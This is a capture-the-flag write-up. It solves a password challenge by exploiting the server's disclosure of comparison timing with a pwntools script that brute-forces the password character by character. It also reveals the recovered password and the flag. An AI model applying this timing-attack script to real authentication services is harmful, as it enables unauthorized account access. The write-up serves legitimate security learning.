
# Password 

## Description
```
Can you break my super secret secure password? :D

To access the challenge use this in the terminal

nc ctf.copsiitbhu.co.in 21337
```

## Writeup

- after visiting the link we get password input promate

```bash
PASSWORD: hey
Wrong Password!
TIME: 1.8835067749023438e-05
```

- we can see that it's giving time as output which means that this server is vulnerable to time based attack . which nicely explaind in [this](https://ropesec.com/articles/timing-attacks/#:~:text=In%20a%20timing%20attack%2C%20the,the%20algorithms%20of%20the%20application.)

- to exploit it i wirte a script given below 

```py
from pwn import *

passwd = ""
alphabates = "abcdefghijklmnopqrstuvwxyz"

while True:
    max_timing = 0
    for char in alphabates:
        p = remote("ctf.copsiitbhu.co.in", 21337)
        _ = p.recv()
        to_send = f"{passwd}{char}"
        p.sendline(to_send.encode())
        res = p.recv().decode("utf-8")
        # print(res)

        if "Wrong Password!" not in res:
            print(passwd)
        res = res.split("TIME")
        timing = float(res[1].strip().replace(": ",""))

        if timing > max_timing:
            max_timing = timing
            reqi = char

        p.close()

    if "Wrong Password!" not in res:
        print(passwd)
    passwd += reqi
    print(passwd)

```

- this script will give password = mysuperrrsecreeetpasswooordhehehe

- after submiting password we get 

```
PASSWORD: mysuperrrsecreeetpasswooordhehehe
TIME: 0.03557252883911133
You broke my super secret password:\(
FLAG: COPS{time_based_attack_ftw}

```
## Flag 

## COPS{time_based_attack_ftw}
